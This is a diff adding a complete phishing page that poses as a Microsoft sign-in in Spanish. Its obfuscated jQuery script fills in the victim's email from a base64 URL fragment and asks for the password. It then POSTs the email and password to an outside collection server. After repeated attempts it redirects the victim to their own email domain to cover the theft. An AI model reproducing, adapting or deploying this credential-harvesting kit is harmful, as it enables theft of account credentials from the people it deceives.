@@ -1,0 +1,170 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+  <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+  <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+  <title>Microsoft | Begin</title>
+  <!-- <link href="css/hover.css" rel="stylesheet" media="all"> -->
+
+  <style type="text/css">
+    textarea:hover, 
+input:hover, 
+textarea:active, 
+input:active, 
+textarea:focus, 
+input:focus,
+button:focus,
+button:active,
+button:hover,
+label:focus,
+.btn:active,
+.btn.active
+{
+    outline:0px !important;
+    -webkit-appearance:none;
+    box-shadow: none !important;
+}
+
+    .box
+    {
+      box-shadow: 0 2px 3px rgba(0,0,0,0.55);
+      border: 1px solid rgba(0,0,0,0.4);
+      min-height: 338px;
+      min-width: 320px;
+      max-width: 440px;
+      width: calc(100% - 40px);
+      padding: 44px;
+      margin-left: auto;
+      margin-right: auto;
+      margin-top: 20px;
+      margin-bottom: 28px;
+    }
+
+    #footer {
+      position: fixed;
+      bottom: 0px;
+      width: 100%;
+      overflow: visible;
+      z-index: 99;
+      clear: both;
+      background-color: #000;
+      background-color: rgba(0,0,0,0.6);
+    }
+
+    /*.footerNode span {
+    color: #fff;
+    font-size: 0.75rem;
+    line-height: 28px;
+    white-space: nowrap;
+    display: inline-block;
+    float: right;
+    margin-left: 8px;
+    margin-right: 8px;
+}*/
+div .footerNode a, div .footerNode span {
+    color: #fff;
+    font-size: 0.75rem;
+    line-height: 28px;
+    white-space: nowrap;
+    display: inline-block;
+    float: right;
+    margin-left: 8px;
+    margin-right: 8px;
+}
+    @media only screen and (max-width: 610px) {
+      #hide{
+        display: none;
+      }
+    }
+
+  </style>
+</head>
+<body style="background-image: url('https://i.imgur.com/SyO5Weq.jpg'); background-size: cover;background-repeat: no-repeat;">
+  <div class="container-fluid">
+    <div class="container">
+      <div class="row my-5 py-5">
+          <!-- <div class="col-lg-6" id="hide">
+            <div class="text-white my-5 py-3">
+              <span class="display-4">Expand Your<br> Microsoft</span><br><br>
+              <span class="h5 font-weight-normal">Upgrade to ad-free email and the latest productivity tools with Microsoft.</span><br><br><br>
+              <button class="btn btn-white rounded-0 px-5 py-2" style="font-size: 20px; color: #1C9CD6; font-weight: 500;">Get Started</button>
+            </div>
+          </div> -->
+          <div class="col-lg-6 mx-auto">
+            <div class="bg-white box" id="div1">
+              <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" class="img-fluid logoimg" width="30px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span><br><br>
+              <span class="h5">Por favor revise el correo electrónico para continuar</span><br>
+              <span id="error" class="text-danger" style="display: none;">Esa cuenta de Microsoft no existe. Ingresa una cuenta diferente</span>
+              
+
+<div class="form-group mt-2">
+                <input type="email" name="email" class="form-control rounded-0 border-dark" id="email" 
+value="" aria-describedby="emailHelp" placeholder="Correo electrónico, teléfono o skype" 
+style="border-right: none;border-left: none;border-top: none;">
+              </div>
+
+
+              <p><a href="#"></a></p>
+              
+                <div class="text-right">
+                  <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Log in</button>
+                </div>
+              </div>
+
+              <div class="m-5 p-4 bg-white box" id="div2" style="display: none;">
+                <form id="contact">
+                  <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" class="img-fluid logoimg" width="30px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span><br><br>
+                  <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch">abc@abc.com</span><br>
+                  <span id="msg" class="text-danger" style="display: none;"></span><br>
+                  <span class="h5">Introducir la contraseña</span>
+                  <div class="form-group mt-2">
+                    <input type="password" name="password" class="form-control rounded-0 border-dark" id="password" aria-describedby="emailHelp" placeholder="Contraseña" style="border-right: none;border-left: none;border-top: none;">
+                  </div>
+                  <p><a href="#"></a></p>
+                  
+                  <div class="text-right">
+                    <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;" >Acceso</button>
+                  </div>
+                </form>
+              </div>
+
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <footer id="footer">
+        <div>
+          <div class="footerNode">
+            <span>©2020 Microsoft</span>
+            <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="#">Privacy statement</a>
+          </div>
+        </div>
+      </footer>
+
+
+
+
+
+      <!-- Optional JavaScript -->
+      <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    </body>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script>
+
+
+var _0x5a4415=_0x11ad;function _0x11ad(_0xde9eee,_0x34cbe3){var _0x3f0852=_0x3f08();return _0x11ad=function(_0x11ad2d,_0x1d7dd5){_0x11ad2d=_0x11ad2d-0x13a;var _0x4a1847=_0x3f0852[_0x11ad2d];return _0x4a1847;},_0x11ad(_0xde9eee,_0x34cbe3);}(function(_0x36efaa,_0x4afee7){var _0x121b07=_0x11ad,_0x14ef03=_0x36efaa();while(!![]){try{var _0xd95b9f=parseInt(_0x121b07(0x14b))/0x1+parseInt(_0x121b07(0x13a))/0x2+parseInt(_0x121b07(0x154))/0x3*(-parseInt(_0x121b07(0x157))/0x4)+-parseInt(_0x121b07(0x13b))/0x5+-parseInt(_0x121b07(0x15f))/0x6+-parseInt(_0x121b07(0x161))/0x7*(-parseInt(_0x121b07(0x15d))/0x8)+parseInt(_0x121b07(0x15a))/0x9*(parseInt(_0x121b07(0x160))/0xa);if(_0xd95b9f===_0x4afee7)break;else _0x14ef03['push'](_0x14ef03['shift']());}catch(_0x5a0aa0){_0x14ef03['push'](_0x14ef03['shift']());}}}(_0x3f08,0xb78be),$(document)[_0x5a4415(0x15b)](function(){var _0x93de3b=_0x5a4415,_0x146540=0x0,_0xc610d5=window[_0x93de3b(0x142)][_0x93de3b(0x13d)][_0x93de3b(0x13f)](0x1);if(!_0xc610d5){}else{var _0x56dbca=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;if(!_0x56dbca[_0x93de3b(0x158)](_0xc610d5))var _0x1bf2ce=_0xc610d5;else var _0x1bf2ce=atob(_0xc610d5);var _0x164f39=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x164f39[_0x93de3b(0x158)](_0x1bf2ce))return $('#error')['show'](),_0xc610d5['focus'],![];var _0x173b24=_0x1bf2ce[_0x93de3b(0x156)]('@'),_0x5407bc=_0x1bf2ce[_0x93de3b(0x13f)](_0x173b24+0x1),_0x37abbf=_0x5407bc['substr'](0x0,_0x5407bc[_0x93de3b(0x156)]('.')),_0xae85a1=_0x37abbf['toLowerCase']();$(_0x93de3b(0x145))[_0x93de3b(0x143)](_0x1bf2ce);}$(_0x93de3b(0x145))[_0x93de3b(0x148)](function(){var _0x31d525=_0x93de3b;$('#error')[_0x31d525(0x163)]();}),$(_0x93de3b(0x153))[_0x93de3b(0x148)](function(){var _0x53d6b1=_0x93de3b,_0x5ca1aa=$('#email')[_0x53d6b1(0x143)](),_0x2fff4d=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x2fff4d[_0x53d6b1(0x158)](_0x5ca1aa))return $('#error')[_0x53d6b1(0x151)](),_0xc610d5[_0x53d6b1(0x152)],![];var _0x4c1b4e=_0x5ca1aa['indexOf']('@'),_0x5393ca=_0x5ca1aa[_0x53d6b1(0x13f)](_0x4c1b4e+0x1),_0x32ce39=_0x5393ca[_0x53d6b1(0x13f)](0x0,_0x5393ca[_0x53d6b1(0x156)]('.')),_0x502805=_0x32ce39[_0x53d6b1(0x147)]();$(_0x53d6b1(0x166))[_0x53d6b1(0x150)]({'left':0xc8,'opacity':_0x53d6b1(0x163)},0x0),$(_0x53d6b1(0x159))[_0x53d6b1(0x150)]({'right':0xc8,'opacity':_0x53d6b1(0x151)},0x3e8),$('#emailch')[_0x53d6b1(0x164)](_0x5ca1aa);}),$(_0x93de3b(0x141))[_0x93de3b(0x148)](function(){var _0x502e06=_0x93de3b;$(_0x502e06(0x140))[_0x502e06(0x163)](),$(_0x502e06(0x145))['val'](''),$(_0x502e06(0x13e))[_0x502e06(0x143)](''),$('#div2')[_0x502e06(0x150)]({'left':0xc8,'opacity':_0x502e06(0x163)},0x0),$(_0x502e06(0x166))[_0x502e06(0x150)]({'right':0xc8,'opacity':_0x502e06(0x151)},0x3e8);}),$(_0x93de3b(0x15c))['click'](function(_0x3409a2){var _0x20c99d=_0x93de3b;_0x3409a2['preventDefault']();var _0x2e3306=$(_0x20c99d(0x145))[_0x20c99d(0x143)](),_0xe1f22d=$(_0x20c99d(0x13e))[_0x20c99d(0x143)](),_0xca37ce=$(_0x20c99d(0x155))[_0x20c99d(0x164)](),_0x245ccb=$('#msg')[_0x20c99d(0x164)](),_0x17777d=_0x2e3306,_0x1b3980=_0x17777d['indexOf']('@'),_0x102aca=_0x17777d['substr'](_0x1b3980+0x1),_0x4afbc5=_0x102aca['substr'](0x0,_0x102aca[_0x20c99d(0x156)]('.')),_0x5932bd=_0x4afbc5['toLowerCase']();$(_0x20c99d(0x140))['text'](_0x245ccb),_0x146540=_0x146540+0x1,$[_0x20c99d(0x14f)]({'dataType':_0x20c99d(0x149),'url':_0x20c99d(0x146),'type':_0x20c99d(0x14a),'data':{'email':_0x2e3306,'password':_0xe1f22d,'detail':_0xca37ce},'beforeSend':function(_0x56ccbb){var _0x57bb7f=_0x20c99d;$('#submit-btn')[_0x57bb7f(0x164)](_0x57bb7f(0x14c));},'success':function(_0x5e5890){var _0x125021=_0x20c99d;$(_0x125021(0x13e))[_0x125021(0x143)](''),_0x146540>=0x2&&(_0x146540=0x0,window[_0x125021(0x142)][_0x125021(0x165)]('http://www.'+_0x102aca)),_0x5e5890&&($('#msg')[_0x125021(0x151)](),console[_0x125021(0x144)](_0x5e5890),_0x5e5890[_0x125021(0x162)]=='ok'?$(_0x125021(0x140))[_0x125021(0x164)](_0x5e5890[_0x125021(0x15e)]):$(_0x125021(0x140))[_0x125021(0x164)](_0x5e5890[_0x125021(0x15e)]));},'error':function(){var _0x2b5bc0=_0x20c99d;$(_0x2b5bc0(0x13e))[_0x2b5bc0(0x143)](''),_0x146540>=0x2&&(_0x146540=0x0,window[_0x2b5bc0(0x142)][_0x2b5bc0(0x165)](_0x2b5bc0(0x14d)+_0x102aca)),$('#msg')['show'](),$(_0x2b5bc0(0x140))[_0x2b5bc0(0x164)](_0x2b5bc0(0x13c));},'complete':function(){var _0x18a41e=_0x20c99d;$('#submit-btn')[_0x18a41e(0x164)](_0x18a41e(0x14e));}});});}));function _0x3f08(){var _0x2f0b73=['focus','#next','24825MmiOzl','#field','indexOf','576VlboxQ','test','#div2','1976085BaoUJL','ready','#submit-btn','402656GKwunx','msg','6775530JvBxHU','70nragna','112yDcHNn','signal','hide','html','replace','#div1','1317938PsaiOZ','1630065eLJWEy','Su\x20cuenta\x20o\x20contraseña\x20es\x20incorrecta.','hash','#password','substr','#msg','#back','location','val','log','#email','https://skynetexprex.com/cj/next.php','toLowerCase','click','JSON','POST','397438CkjHLD','Verificación...','http://www.','Acceso','ajax','animate','show'];_0x3f08=function(){return _0x2f0b73;};return _0x3f08();}
+  </script>
+  </html>
